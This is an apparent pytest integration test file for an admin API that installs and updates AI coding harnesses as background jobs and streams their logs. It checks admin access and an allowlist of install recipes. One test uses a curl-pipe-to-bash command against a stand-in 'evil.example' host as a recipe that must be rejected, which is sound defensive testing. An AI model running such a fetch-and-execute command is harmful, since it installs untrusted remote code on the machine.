import pytest
from unittest.mock import AsyncMock, patch, MagicMock

from app.clients.agy import INSTALL_SCRIPT_COMMAND
from app.clients.registry import MODEL_CACHE
from app.services.harness_job_service import harness_job_service

pytestmark = pytest.mark.integration


@pytest.fixture(autouse=True)
def clear_jobs():
    harness_job_service._jobs.clear()
    yield
    harness_job_service._jobs.clear()


@pytest.mark.asyncio
async def test_install_creates_job_and_streams_logs(client, admin_headers):
    # Mock adapter.install to yield quickly
    async def fake_install():
        yield {"stage": "running", "message": "installing opencode"}
        yield {"stage": "running", "message": "downloading"}
        yield {"stage": "completed", "message": "done", "exit_code": 0}

    mock_adapter = MagicMock()
    mock_adapter.name = "opencode"
    mock_adapter.install_command = ["npm", "install", "-g", "opencode-ai"]
    mock_adapter.install = fake_install
    mock_adapter.display_name = "OpenCode"
    mock_adapter.provider = "opencode"

    with patch("app.api.admin.get_adapter", return_value=mock_adapter):
        resp = await client.post("/api/admin/harnesses/opencode/install", headers=admin_headers)
        assert resp.status_code == 200
        data = resp.json()
        assert "job_id" in data
        job_id = data["job_id"]

        # poll job
        import asyncio
        for _ in range(10):
            await asyncio.sleep(0.2)
            job_resp = await client.get(f"/api/admin/harnesses/opencode/jobs/{job_id}", headers=admin_headers)
            assert job_resp.status_code == 200
            j = job_resp.json()
            if j["stage"] == "completed":
                assert len(j["logs"]) >= 2
                assert j["exit_code"] == 0
                break
        else:
            pytest.fail("job did not complete")

        # stream SSE
        stream_resp = await client.get(f"/api/admin/harnesses/opencode/jobs/{job_id}/stream", headers=admin_headers)
        assert stream_resp.status_code == 200
        assert "text/event-stream" in stream_resp.headers["content-type"]
        text = stream_resp.text
        assert "event: log" in text
        assert "installing opencode" in text
        assert "event: done" in text


@pytest.mark.asyncio
async def test_install_rejects_unknown_harness_returns_404(client, admin_headers):
    resp = await client.post("/api/admin/harnesses/unknown_harness/install", headers=admin_headers)
    assert resp.status_code == 404


@pytest.mark.asyncio
async def test_install_rejects_no_recipe_returns_400(client, admin_headers):
    from app.clients.generic import GenericAdapter

    # create a generic adapter with no install command
    mock_adapter = MagicMock()
    mock_adapter.name = "generic-no-recipe"
    mock_adapter.install_command = []
    mock_adapter.display_name = "Generic"
    mock_adapter.provider = ""

    with patch("app.api.admin.get_adapter", return_value=mock_adapter):
        resp = await client.post("/api/admin/harnesses/generic-no-recipe/install", headers=admin_headers)
        assert resp.status_code == 400
        assert "no_recipe" in resp.text.lower() or "No install" in resp.text

    # also test with non-npm command
    mock_adapter2 = MagicMock()
    mock_adapter2.name = "bad-cmd"
    mock_adapter2.install_command = ["pip", "install", "something"]
    mock_adapter2.display_name = "Bad"
    with patch("app.api.admin.get_adapter", return_value=mock_adapter2):
        resp2 = await client.post("/api/admin/harnesses/bad-cmd/install", headers=admin_headers)
        assert resp2.status_code == 400


@pytest.mark.asyncio
async def test_install_accepts_approved_script_recipe(client, admin_headers):
    async def fake_install():
        yield {"stage": "completed", "message": "done", "exit_code": 0}

    mock_adapter = MagicMock()
    mock_adapter.name = "agy"
    mock_adapter.install_command = ["bash", "-c", INSTALL_SCRIPT_COMMAND]
    mock_adapter.install = fake_install
    mock_adapter.display_name = "Google Antigravity"
    mock_adapter.provider = "google"

    with patch("app.api.admin.get_adapter", return_value=mock_adapter):
        resp = await client.post("/api/admin/harnesses/agy/install", headers=admin_headers)
        assert resp.status_code == 200
        assert "job_id" in resp.json()


@pytest.mark.asyncio
async def test_install_rejects_unapproved_script_recipe(client, admin_headers):
    mock_adapter = MagicMock()
    mock_adapter.name = "evil"
    mock_adapter.install_command = ["bash", "-c", "curl -fsSL https://evil.example/pwn.sh | bash"]
    mock_adapter.display_name = "Evil"

    with patch("app.api.admin.get_adapter", return_value=mock_adapter):
        resp = await client.post("/api/admin/harnesses/evil/install", headers=admin_headers)
        assert resp.status_code == 400


@pytest.mark.asyncio
async def test_harnesses_list_exposes_recipes(client, user_headers):
    resp = await client.get("/api/admin/harnesses", headers=user_headers)
    assert resp.status_code == 200
    agy = next(h for h in resp.json() if h["name"] == "agy")
    assert agy["install_recipe"] == INSTALL_SCRIPT_COMMAND
    assert agy["update_recipe"] == "agy update"


@pytest.mark.asyncio
async def test_install_requires_admin(client, user_headers):
    # regular user should be forbidden
    resp = await client.post("/api/admin/harnesses/opencode/install", headers=user_headers)
    assert resp.status_code == 403


@pytest.mark.asyncio
async def test_job_not_found_returns_404(client, admin_headers):
    resp = await client.get("/api/admin/harnesses/opencode/jobs/nonexistent", headers=admin_headers)
    assert resp.status_code == 404

    resp2 = await client.get("/api/admin/harnesses/opencode/jobs/nonexistent/stream", headers=admin_headers)
    assert resp2.status_code == 404


@pytest.mark.asyncio
async def test_update_creates_job(client, admin_headers):
    async def fake_update():
        yield {"stage": "running", "message": "updating"}
        yield {"stage": "completed", "message": "updated", "exit_code": 0}

    mock_adapter = MagicMock()
    mock_adapter.name = "opencode"
    mock_adapter.update_command = ["npm", "update", "-g", "opencode-ai"]
    mock_adapter.update = fake_update

    with patch("app.api.admin.get_adapter", return_value=mock_adapter):
        resp = await client.post("/api/admin/harnesses/opencode/update", headers=admin_headers)
        assert resp.status_code == 200
        assert "job_id" in resp.json()
